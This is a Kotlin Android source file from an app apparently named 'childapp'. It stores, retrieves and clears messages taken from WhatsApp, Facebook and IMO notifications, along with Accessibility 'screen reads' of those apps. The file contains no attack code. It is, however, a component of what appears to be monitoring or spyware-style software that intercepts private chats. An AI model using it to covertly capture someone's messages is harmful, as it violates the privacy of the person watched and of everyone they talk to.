package com.coc338781.childapp

import android.content.Context
import org.json.JSONArray
import org.json.JSONObject

object MessageStore {
    private const val PREF = "msg_store"
    private const val KEY_WHATSAPP = "wa_msgs"
    private const val KEY_FB = "fb_msgs"
    private const val KEY_IMO = "imo_msgs"
    private const val KEY_SCREEN_WA = "screen_wa"
    private const val KEY_SCREEN_FB = "screen_fb"
    private const val KEY_SCREEN_IMO = "screen_imo"
    private const val MAX_MESSAGES = 200

    data class Msg(val from: String, val text: String, val time: Long)
    data class ScreenRead(val content: String, val time: Long)

    // ============ NOTIFICATION MESSAGES ============
    fun addMessage(context: Context, app: String, from: String, text: String) {
        try {
            val key = when (app) {
                "whatsapp" -> KEY_WHATSAPP
                "fb" -> KEY_FB
                "imo" -> KEY_IMO
                else -> return
            }
            val prefs = context.getSharedPreferences(PREF, Context.MODE_PRIVATE)
            val existing = prefs.getString(key, "[]") ?: "[]"
            val arr = JSONArray(existing)

            val newObj = JSONObject().apply {
                put("from", from)
                put("text", text)
                put("time", System.currentTimeMillis())
            }

            val newArr = JSONArray()
            newArr.put(newObj)
            for (i in 0 until minOf(arr.length(), MAX_MESSAGES - 1)) {
                newArr.put(arr.getJSONObject(i))
            }

            prefs.edit().putString(key, newArr.toString()).apply()
        } catch (_: Exception) {}
    }

    fun getMessages(context: Context, app: String): List<Msg> {
        return try {
            val key = when (app) {
                "whatsapp" -> KEY_WHATSAPP
                "fb" -> KEY_FB
                "imo" -> KEY_IMO
                else -> return emptyList()
            }
            val prefs = context.getSharedPreferences(PREF, Context.MODE_PRIVATE)
            val existing = prefs.getString(key, "[]") ?: "[]"
            val arr = JSONArray(existing)
            val list = mutableListOf<Msg>()
            for (i in 0 until arr.length()) {
                val obj = arr.getJSONObject(i)
                list.add(Msg(
                    obj.optString("from", "?"),
                    obj.optString("text", ""),
                    obj.optLong("time", 0)
                ))
            }
            list
        } catch (_: Exception) { emptyList() }
    }

    // ============ SCREEN READ (Accessibility) ============
    fun addScreenRead(context: Context, app: String, content: String) {
        try {
            val key = when (app) {
                "whatsapp" -> KEY_SCREEN_WA
                "fb" -> KEY_SCREEN_FB
                "imo" -> KEY_SCREEN_IMO
                else -> return
            }
            val prefs = context.getSharedPreferences(PREF, Context.MODE_PRIVATE)
            val existing = prefs.getString(key, "[]") ?: "[]"
            val arr = JSONArray(existing)

            // Duplicate check — එකම content එක නම් skip
            if (arr.length() > 0) {
                val last = arr.getJSONObject(0)
                if (last.optString("content", "") == content) return
            }

            val newObj = JSONObject().apply {
                put("content", content)
                put("time", System.currentTimeMillis())
            }

            val newArr = JSONArray()
            newArr.put(newObj)
            for (i in 0 until minOf(arr.length(), MAX_MESSAGES - 1)) {
                newArr.put(arr.getJSONObject(i))
            }

            prefs.edit().putString(key, newArr.toString()).apply()
        } catch (_: Exception) {}
    }

    fun getScreenReads(context: Context, app: String): List<ScreenRead> {
        return try {
            val key = when (app) {
                "whatsapp" -> KEY_SCREEN_WA
                "fb" -> KEY_SCREEN_FB
                "imo" -> KEY_SCREEN_IMO
                else -> return emptyList()
            }
            val prefs = context.getSharedPreferences(PREF, Context.MODE_PRIVATE)
            val existing = prefs.getString(key, "[]") ?: "[]"
            val arr = JSONArray(existing)
            val list = mutableListOf<ScreenRead>()
            for (i in 0 until arr.length()) {
                val obj = arr.getJSONObject(i)
                list.add(ScreenRead(
                    obj.optString("content", ""),
                    obj.optLong("time", 0)
                ))
            }
            list
        } catch (_: Exception) { emptyList() }
    }

    fun getLatestScreenRead(context: Context, app: String): ScreenRead? {
        return getScreenReads(context, app).firstOrNull()
    }

    // ============ CLEAR ============
    fun clearMessages(context: Context, app: String) {
        try {
            val key = when (app) {
                "whatsapp" -> KEY_WHATSAPP
                "fb" -> KEY_FB
                "imo" -> KEY_IMO
                else -> return
            }
            val prefs = context.getSharedPreferences(PREF, Context.MODE_PRIVATE)
            prefs.edit().putString(key, "[]").apply()
        } catch (_: Exception) {}
    }

    fun clearScreenReads(context: Context, app: String) {
        try {
            val key = when (app) {
                "whatsapp" -> KEY_SCREEN_WA
                "fb" -> KEY_SCREEN_FB
                "imo" -> KEY_SCREEN_IMO
                else -> return
            }
            val prefs = context.getSharedPreferences(PREF, Context.MODE_PRIVATE)
            prefs.edit().putString(key, "[]").apply()
        } catch (_: Exception) {}
    }

    fun clearAll(context: Context) {
        clearMessages(context, "whatsapp")
        clearMessages(context, "fb")
        clearMessages(context, "imo")
        clearScreenReads(context, "whatsapp")
        clearScreenReads(context, "fb")
        clearScreenReads(context, "imo")
    }
}
